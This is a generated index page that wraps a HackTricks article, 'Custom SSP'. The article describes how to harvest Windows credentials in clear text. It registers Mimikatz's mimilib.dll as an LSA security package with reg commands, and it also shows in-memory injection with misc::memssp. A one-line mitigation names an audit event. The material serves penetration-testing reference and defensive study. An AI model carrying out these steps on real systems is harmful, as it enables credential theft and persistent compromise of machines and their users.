---
parsed_by: focuslocust
source: hacktricks
type: generated
---
# Custom SSP

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `hacktricks` |
| Type | `hacktricks-topic` |
| Record ID | `hacktricks-windows-hardening-active-directory-methodology-custom-ssp` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/hacktricks/src/windows-hardening/active-directory-methodology/custom-ssp.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [Custom SSP](../../topics/windows-hardening/custom-ssp.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | hacktricks-windows-hardening-active-directory-methodology-custom-ssp |
| name | Custom SSP |
| type | hacktricks-topic |
| source | hacktricks |
| url | https://github.com/HackTricks-wiki/hacktricks/blob/master/src/windows-hardening/active-directory-methodology/custom-ssp.md |

## Preserved Source Material

````yaml
_body: "# Custom SSP\n\n{{#include ../../banners/hacktricks-training.md}}\n\n### Custom SSP\n\n[Learn what is a SSP (Security\
  \ Support Provider) here.](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi)\\\
  \nYou can create you **own SSP** to **capture** in **clear text** the **credentials** used to access the machine.\n\n####\
  \ Mimilib\n\nYou can use the `mimilib.dll` binary provided by Mimikatz. **This will log inside a file all the credentials\
  \ in clear text.**\\\nDrop the dll in `C:\\Windows\\System32\\`\\\nGet a list existing LSA Security Packages:\n\n```bash:attacker@target\n\
  PS C:\\> reg query hklm\\system\\currentcontrolset\\control\\lsa\\ /v \"Security Packages\"\n\nHKEY_LOCAL_MACHINE\\system\\\
  currentcontrolset\\control\\lsa\n    Security Packages    REG_MULTI_SZ    kerberos\\0msv1_0\\0schannel\\0wdigest\\0tspkg\\\
  0pku2u\n```\n\nAdd `mimilib.dll` to the Security Support Provider list (Security Packages):\n\n```bash\nreg add \"hklm\\\
  system\\currentcontrolset\\control\\lsa\\\" /v \"Security Packages\"\n```\n\nAnd after a reboot all credentials can be found\
  \ in clear text in `C:\\Windows\\System32\\kiwissp.log`\n\n#### In memory\n\nYou can also inject this in memory directly\
  \ using Mimikatz (notice that it could be a little bit unstable/not working):\n\n```bash\nprivilege::debug\nmisc::memssp\n\
  ```\n\nThis won't survive reboots.\n\n#### Mitigation\n\nEvent ID 4657 - Audit creation/change of `HKLM:\\System\\CurrentControlSet\\\
  Control\\Lsa\\SecurityPackages`\n\n{{#include ../../banners/hacktricks-training.md}}"
_relative_path: windows-hardening/active-directory-methodology/custom-ssp.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/hacktricks/src/windows-hardening/active-directory-methodology/custom-ssp.md
````
